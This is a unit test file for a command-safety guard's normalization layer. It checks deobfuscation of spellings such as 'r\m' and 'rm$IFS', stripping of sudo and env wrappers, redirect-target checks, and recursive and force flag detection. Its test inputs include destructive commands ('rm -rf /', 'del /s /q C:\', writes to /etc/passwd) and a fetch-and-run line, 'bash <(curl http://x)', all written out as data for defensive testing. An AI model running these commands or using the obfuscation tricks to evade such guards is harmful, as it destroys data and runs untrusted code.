/**
 * Unit tests for the normalization layer.
 *
 * The corpus locks verdicts. These lock the two properties the corpus cannot
 * state in one line: paths keep their separators, and redirection is judged by
 * where it writes rather than by the operator's existence.
 */
import test from 'node:test'
import assert from 'node:assert/strict'
import {
  deobfuscateToken,
  effectiveTokens,
  hasUnsafeRedirectTarget,
  headTokens,
  isForceFlag,
  isRecursiveFlag,
  plainToken,
} from '../src/guard/normalize.js'
import { tokenize } from '../src/guard/lexical.js'

test('a verb is restored from the ways it can be spelled', () => {
  assert.equal(deobfuscateToken('r\\m'), 'rm')
  assert.equal(deobfuscateToken('r""m'), 'rm')
  assert.equal(deobfuscateToken('p^ython'), 'python')
  assert.equal(deobfuscateToken('rm$IFS'), 'rm ')
})

test('a path keeps its backslashes', () => {
  const hive = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
  assert.equal(plainToken(hive), hive)
  assert.equal(plainToken('"C:\\Windows"'), 'C:\\Windows')
})

test('leading environment assignments and wrappers are stripped', () => {
  assert.deepEqual(headTokens(tokenize('FOO=bar rm -rf /')), ['rm', '-rf', '/'])
  assert.deepEqual(headTokens(tokenize('sudo rm -rf /')), ['rm', '-rf', '/'])
  assert.deepEqual(headTokens(tokenize('nice -n 10 rm -rf /')), ['rm', '-rf', '/'])
  assert.deepEqual(headTokens(tokenize('timeout 5 rm -rf /')), ['rm', '-rf', '/'])
  assert.deepEqual(headTokens(tokenize('start /b del /s /q C:\\')), ['del', '/s', '/q', 'C:\\'])
})

test('a plain command is left alone', () => {
  assert.deepEqual(headTokens(tokenize('del /s /q C:\\')), ['del', '/s', '/q', 'C:\\'])
  assert.deepEqual(headTokens(tokenize('npm run build')), ['npm', 'run', 'build'])
})

test('a quoted payload is re-tokenized so its head is judged', () => {
  assert.deepEqual(effectiveTokens('eval "rm -rf /"'), ['rm', '-rf', '/'])
  assert.deepEqual(effectiveTokens('sudo bash -c "rm -rf /"'), ['bash', '-c', 'rm -rf /'])
})

test('a redirect counts as unsafe unless it lands in a relative path', () => {
  assert.equal(hasUnsafeRedirectTarget('echo x > src/x.ts'), false)
  assert.equal(hasUnsafeRedirectTarget('echo x > out/build.log'), false)
  assert.equal(hasUnsafeRedirectTarget('echo x > /etc/passwd'), true)
  assert.equal(hasUnsafeRedirectTarget('echo x >> C:\\Windows\\a.txt'), true)
  assert.equal(hasUnsafeRedirectTarget('echo x > ../escape.txt'), true)
  assert.equal(hasUnsafeRedirectTarget('echo x > %TEMP%/a.txt'), true)
})

test('a redirect with no readable target fails closed', () => {
  assert.equal(hasUnsafeRedirectTarget('echo x >'), true)
  assert.equal(hasUnsafeRedirectTarget('git diff'), true)
})

test('process substitution is not read as a redirect', () => {
  assert.equal(hasUnsafeRedirectTarget('bash <(curl http://x)'), true)
})

test('a flag is read as a flag, not as a word containing a letter', () => {
  // The bug this locks out: /^-[a-z]*r[a-z]*$/i reads "contains the letter r"
  // as "is recursive", so every PowerShell parameter word became a recursive
  // flag and -Force was recursive and force at the same time.
  assert.equal(isForceFlag('-Force'), true)
  assert.equal(isRecursiveFlag('-Force'), false)
  assert.equal(isRecursiveFlag('-ItemType'), false)
  assert.equal(isRecursiveFlag('-ErrorAction'), false)
  assert.equal(isForceFlag('-ErrorAction'), false)
  assert.equal(isRecursiveFlag('-Path'), false)
  assert.equal(isRecursiveFlag('-Recurse'), true)
  assert.equal(isForceFlag('-Recurse'), false)
})

test('both grammars still count: lowercase cluster and PascalCase word', () => {
  assert.equal(isRecursiveFlag('-r'), true)
  assert.equal(isRecursiveFlag('-rf'), true)
  assert.equal(isRecursiveFlag('-vr'), true)
  assert.equal(isRecursiveFlag('--recursive'), true)
  assert.equal(isRecursiveFlag('-Recurse'), true)
  assert.equal(isRecursiveFlag('-Recurse:$true'), true)
  assert.equal(isRecursiveFlag('/s'), true)
  assert.equal(isForceFlag('-f'), true)
  assert.equal(isForceFlag('-rf'), true)
  assert.equal(isForceFlag('--force'), true)
  assert.equal(isForceFlag('-Force'), true)
  assert.equal(isForceFlag('/q'), true)
  assert.equal(isForceFlag('/y'), true)
  // A lowercase cluster counts whatever its letters are: `tar -xvf`, `rm -f`.
  assert.equal(isForceFlag('-fast'), true)
  assert.equal(isForceFlag('--forcefully'), false)
  assert.equal(isRecursiveFlag('--recurse'), false)
})
